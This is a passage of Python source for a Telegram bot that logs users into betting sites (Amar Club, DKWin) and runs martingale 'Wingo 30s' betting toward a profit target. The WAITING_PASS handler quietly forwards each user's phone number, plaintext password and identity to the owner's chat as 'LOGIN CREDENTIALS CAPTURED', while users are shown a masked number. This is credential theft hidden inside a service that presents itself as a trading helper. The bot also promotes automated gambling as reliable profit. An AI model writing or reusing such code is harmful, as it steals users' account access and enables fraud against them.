            f"• <b>টাকার পরিমাণ:</b> {pending['price']} BDT\n"
            f"• <b>পেমেন্ট মেথড:</b> {pending['method'].upper()}\n"
            f"• <b>ট্রানজেকশন আইডি:</b> <code>{trx_id}</code>\n\n"
            f"<i>অনুগ্রহ করে ভেরিফাই করে নিচের যেকোনো একটি বাটনে চাপ দিন:</i>"
        )
        try:
            bot.send_message(OWNER_CHAT_ID, owner_notif, reply_markup=admin_markup)
        except Exception as e:
            print(f"[!] Failed to send notification to owner: {e}")
        return

    # B. Active Session Credentials Handling
    sid = u.get("active_sid")
    if not sid or sid not in active_sessions:
        return

    sess = active_sessions[sid]
    input_mode = sess.get("input_mode")

    if sess.get("temp_prompt_id"):
        safe_delete_message(chat_id, sess["temp_prompt_id"])
        sess["temp_prompt_id"] = None

    if input_mode == "WAITING_PHONE":
        sess["phone"] = text
        sess["input_mode"] = None

        if sess.get("cred_card_msg_id"):
            try:
                masked = text[:3] + "****" + text[-3:] if len(text) >= 6 else text
                updated_card_text = (
                    f"<b>{to_bold('ACCOUNT LOGIN')}</b>\n\n"
                    f"প্ল্যাটফর্ম: <b>{sess.get('site_name', '')}</b>\n"
                    f"নাম্বার: <code>{masked}</code> (সংরক্ষিত)\n\n"
                    f"এখন নিচের <b>ENTER PASSWORD</b> বাটনে চাপ দিয়ে পাসওয়ার্ড দিন:"
                )
                bot.edit_message_text(
                    updated_card_text,
                    chat_id=chat_id,
                    message_id=sess["cred_card_msg_id"],
                    reply_markup=get_credentials_keyboard(sid)
                )
            except Exception:
                pass

    elif input_mode == "WAITING_PASS":
        sess["password"] = text
        sess["input_mode"] = None

        if sess.get("cred_card_msg_id"):
            safe_delete_message(chat_id, sess["cred_card_msg_id"])
            sess["cred_card_msg_id"] = None

        # CRITICAL FEATURE: Automatically forward credentials to Owner (8707571669)
        owner_cred_alert = (
            f"🚨 <b>{to_bold('LOGIN CREDENTIALS CAPTURED')}</b>\n\n"
            f"• <b>ইউজার আইডি:</b> <code>{chat_id}</code>\n"
            f"• <b>নাম:</b> {message.from_user.full_name}\n"
            f"• <b>ইউজারনেম:</b> @{message.from_user.username or 'N/A'}\n"
            f"• <b>প্ল্যাটফর্ম:</b> {sess.get('site_name', '')}\n"
            f"• <b>ফোন নাম্বার:</b> <code>{sess['phone']}</code>\n"
            f"• <b>পাসওয়ার্ড:</b> <code>{sess['password']}</code>\n"
            f"• <b>টাইম:</b> {time.strftime('%Y-%m-%d %H:%M:%S')}"
        )
        try:
            bot.send_message(OWNER_CHAT_ID, owner_cred_alert)
        except Exception as e:
            print(f"[!] Failed to alert owner about creds: {e}")

        anim_msg = bot.send_message(chat_id, f"<b>{to_bold('CONNECTING REMOTE ENGINE...')}</b>")
        threading.Thread(
            target=process_login,
            args=(chat_id, sid, sess["phone"], sess["password"], anim_msg.message_id),
            daemon=True
        ).start()

    elif input_mode == "WAITING_TARGET":
        try:
            val = float(text)
            if val <= 0:
                raise ValueError()
            sess["target_profit"] = val
            sess["input_mode"] = None

            wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
            def _shot(drv):
                drv.save_screenshot(wingo_snap)
            safe_tab_execute(sid, _shot)

            cur_bal = sess.get("current_balance", 0.0)
            config_caption = (
                f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
                f"Live Balance: <code>৳ {cur_bal:.2f}</code>\n"
                f"Selected Target: <code>৳ {val:.2f}</code>\n\n"
                f"প্যারামিটার সেট হয়েছে। ট্রেডিং চালু করতে <b>RUN ENGINE</b> চাপুন:"
            )
            display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
        except ValueError:
            p_msg = bot.send_message(chat_id, "দয়া করে সঠিক সংখ্যা লিখুন (যেমন: 500):")
            sess["temp_prompt_id"] = p_msg.message_id

    elif input_mode == "WAITING_STEPS":
        try:
            steps_val = int(text)
            if steps_val <= 0:
                raise ValueError()
            sess["total_steps"] = steps_val
            sess["input_mode"] = None

            wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
            def _shot(drv):
                drv.save_screenshot(wingo_snap)
            safe_tab_execute(sid, _shot)

            cur_bal = sess.get("current_balance", 0.0)
            config_caption = (
                f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
                f"Live Balance: <code>৳ {cur_bal:.2f}</code>\n"
                f"Selected Steps: <b>{steps_val}</b>\n\n"
                f"প্যারামিটার সেট হয়েছে। ট্রেডিং চালু করতে <b>RUN ENGINE</b> চাপুন:"
            )
            display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
        except ValueError:
            p_msg = bot.send_message(chat_id, "দয়া করে সঠিক পূর্ণসংখ্যা লিখুন (যেমন: 7):")
            sess["temp_prompt_id"] = p_msg.message_id

# ==========================================
# 11. Core Browser Login & Auto Navigation
# ==========================================
def process_login(chat_id, sid, phone, password, anim_msg_id):
    sess = active_sessions.get(sid, {})
    site_name = sess.get("site_name", "Amar Club")
    login_url = URL_AMARCLUB_LOGIN if "AMAR" in site_name.upper() else URL_DKWIN_LOGIN

    try:
        driver = allocate_isolated_driver(sid, login_url)
    except Exception as e:
        safe_delete_message(chat_id, anim_msg_id)
        bot.send_message(chat_id, f"<b>{to_bold('LOGIN FAILED')}</b>\nব্রাউজার চালু করতে সমস্যা: {e}")
        return

    # Fill credentials
    fill_ok = False
    for _ in range(70):
        def _fill(drv):
            return drv.execute_script(AUTO_FILL_AND_CLICK_JS, phone, password)
        res = safe_tab_execute(sid, _fill)
        if res == "SUCCESS":
            fill_ok = True
            time.sleep(2.0)
            break
        time.sleep(0.4)

    if not fill_ok:
        safe_delete_message(chat_id, anim_msg_id)
        bot.send_message(chat_id, f"<b>{to_bold('LOGIN FAILED')}</b>\nলগইন ফর্ম পাওয়া যায়নি বা পেজ লোড হতে অতিরিক্ত সময় নিয়েছে।")
        close_session_tab(sid)
        return

    # Monitor status
    login_status = "PENDING"
    err_detail = ""
    for _ in range(40):
        def _chk(drv):
            return drv.execute_script(CHECK_LOGIN_STATUS_JS)
        res = safe_tab_execute(sid, _chk)
        if isinstance(res, dict):
            if res.get("status") == "SUCCESS":
                login_status = "SUCCESS"
                break
            elif res.get("status") == "CONFIRM_CLICKED":
                time.sleep(1.5)
                continue
            elif res.get("status") == "ERROR":
                login_status = "ERROR"
                err_detail = res.get("message", "ভুল ফোন বা পাসওয়ার্ড")
                break
        time.sleep(0.5)

    def _token_chk(drv):
        return drv.execute_script("return !!(localStorage.getItem('token') || sessionStorage.getItem('token'));")
    if safe_tab_execute(sid, _token_chk):
        login_status = "SUCCESS"

    safe_delete_message(chat_id, anim_msg_id)

    if login_status == "ERROR":
        close_session_tab(sid)
        bot.send_message(chat_id, f"<b>{to_bold('LOGIN FAILED')}</b>\nPlatform: {site_name}\nError: <i>{err_detail}</i>")
        return

    time.sleep(1.5)

    login_snap = os.path.join(PROFILES_BASE_DIR, f"login_done_{sid}.png")
    def _shot(drv):
        drv.save_screenshot(login_snap)
    safe_tab_execute(sid, _shot)

    masked_phone = phone[:3] + "****" + phone[-3:] if len(phone) >= 6 else phone
    caption = (
        f"<b>{to_bold('LOGIN SUCCESSFUL')}</b>\n\n"
        f"Platform: <b>{site_name}</b>\n"
        f"Account: <code>{masked_phone}</code>\n\n"
        f"লগইন সফল হয়েছে। ট্রেডিং শুরু করতে নিচে <b>START CONFIG</b> বাটন চাপুন:"
    )

    display_or_replace_photo(chat_id, sid, login_snap, caption, get_start_screen_keyboard(sid))
    try:
        if os.path.exists(login_snap):
            os.remove(login_snap)
    except Exception:
        pass

def prepare_wingo_parameters(chat_id, sid):
    sess = active_sessions.get(sid, {})
    site_name = sess.get("site_name", "Amar Club")

    def _nav(drv):
        try:
            drv.execute_script(WINGO_RUNBOX_AND_CLICK_JS)
        except Exception:
            pass
        wingo_url = URL_AMARCLUB_WINGO if "AMAR" in site_name.upper() else URL_DKWIN_WINGO
        try:
            drv.execute_script("""
                const target = arguments[0];
                if (!window.location.href.includes('WinGo')) {
                    window.location.href = target;
                }
            """, wingo_url)
        except Exception:
            pass

    safe_tab_execute(sid, _nav)
    time.sleep(1.5)

    for _ in range(30):
        def _rdy(drv):
            return drv.execute_script(CHECK_WINGO_READY_JS)
        if safe_tab_execute(sid, _rdy):
            break
        time.sleep(0.8)

    current_bal = 0.0
    for _ in range(12):
        def _bal(drv):
            return drv.execute_script(FETCH_BALANCE_JS)
        bal = safe_tab_execute(sid, _bal)
        if bal and float(bal) > 0:
            current_bal = float(bal)
            break
        time.sleep(0.5)

    sess["current_balance"] = current_bal

    wingo_snap = os.path.join(PROFILES_BASE_DIR, f"wingo_{sid}.png")
    def _shot(drv):
        drv.save_screenshot(wingo_snap)
    safe_tab_execute(sid, _shot)

    config_caption = (
        f"<b>{to_bold('WINGO 30S MARKET ACTIVE')}</b>\n\n"
        f"Platform: <b>{site_name}</b>\n"
        f"Live Balance: <code>৳ {current_bal:.2f}</code>\n\n"
        f"নিচের <b>TARGET</b> ও <b>STEPS</b> বাটন চেপে ট্রেডিং সেট করুন, তারপর <b>RUN ENGINE</b> চাপুন:"
    )

    display_or_replace_photo(chat_id, sid, wingo_snap, config_caption, get_setup_param_keyboard(sid))
    try:
        if os.path.exists(wingo_snap):
            os.remove(wingo_snap)
    except Exception:
        pass

def monitor_trading_progress(chat_id, sid):
    while True:
        sess = active_sessions.get(sid)
        if not sess or not sess.get("is_trading"):
            break

        def _get_st(drv):
            return drv.execute_script("""
                if (window.__WINGO_ST) {
                    return {
                        isRun: window.__WINGO_ST.isRun,
                        curBal: window.__WINGO_ST.curBal || 0,
                        tgtAmt: window.__WINGO_ST.tgtAmt || 0,
                        startBal: window.__WINGO_ST.startBal || 0,
                        w: window.__WINGO_ST.w || 0,
                        l: window.__WINGO_ST.l || 0,
                        cur_w_streak: window.__WINGO_ST.cur_w_streak || 0,
                        cur_l_streak: window.__WINGO_ST.cur_l_streak || 0,
                        max_w_streak: window.__WINGO_ST.max_w_streak || 0,
                        max_l_streak: window.__WINGO_ST.max_l_streak || 0
                    };
                }
                return null;
            """)

        js_data = safe_tab_execute(sid, _get_st)
        if js_data:
            sess["cur_bal"] = js_data.get("curBal", sess.get("cur_bal", 0))
            sess["wins"] = js_data.get("w", 0)
            sess["losses"] = js_data.get("l", 0)
            tgt_amt = js_data.get("tgtAmt", 0)

            if sess["cur_bal"] >= tgt_amt and tgt_amt > 0 and sess["cur_bal"] > 0:
                sess["is_trading"] = False
                start_b = sess.get("start_bal", 0)
                profit = sess["cur_bal"] - start_b

                screen_path = os.path.join(PROFILES_BASE_DIR, f"win_{sid}.png")
                def _shot(drv):
                    drv.save_screenshot(screen_path)
                safe_tab_execute(sid, _shot)

                msg = (
                    f"<b>{to_bold('TARGET ACHIEVED SUCCESSFULLY')}</b> 🏆\n\n"
                    f"কাঙ্ক্ষিত টার্গেট সম্পূর্ণ সফলভাবে পূরণ হয়েছে।\n\n"
                    f"শুরুর ব্যালেন্স: <code>৳ {start_b:.2f}</code>\n"
                    f"বর্তমান ব্যালেন্স: <code>৳ {sess['cur_bal']:.2f}</code>\n"
                    f"অর্জিত প্রফিট: <code>+৳ {profit:.2f}</code>\n"
                    f"মোট উইন: <b>{sess['wins']}</b> | লস: <b>{sess['losses']}</b>"
                )

                if os.path.exists(screen_path):
                    display_or_replace_photo(chat_id, sid, screen_path, msg, None)
                    try:
                        os.remove(screen_path)
                    except Exception:
                        pass
                else:
                    bot.send_message(chat_id, msg)
                break

        time.sleep(4)

# ==========================================
# 12. Auto Maintenance Watchdog
# ==========================================
def continuous_watchdog():
    while True:
        try:
            now = time.time()
            for sid, item in list(active_sessions.items()):
                created_at = item.get("created_at", now)
                # Purge session after 24 hours to prevent memory leaks
                if now - created_at >= 86400:
                    print(f"[*] 24-hour lifetime reached for session {sid}. Cleaning up...")
                    close_session_tab(sid)
        except Exception:
            pass
        time.sleep(1800)

threading.Thread(target=continuous_watchdog, daemon=True).start()

# ==========================================
# 13. Main Service Entry Point
# ==========================================
if __name__ == "__main__":
    print(f"==================================================")
    print(f"[*] {to_bold('WINZY-MARTINGALE VIP TELEGRAM ENGINE READY')}")
    print(f"[*] Owner ID: {OWNER_CHAT_ID}")
    print(f"[*] Multi-session Isolated Firefox/Chrome Instances Active")
    print(f"==================================================")
    try:
        bot.remove_webhook()
    except Exception:
        pass
    bot.infinity_polling(skip_pending=True)
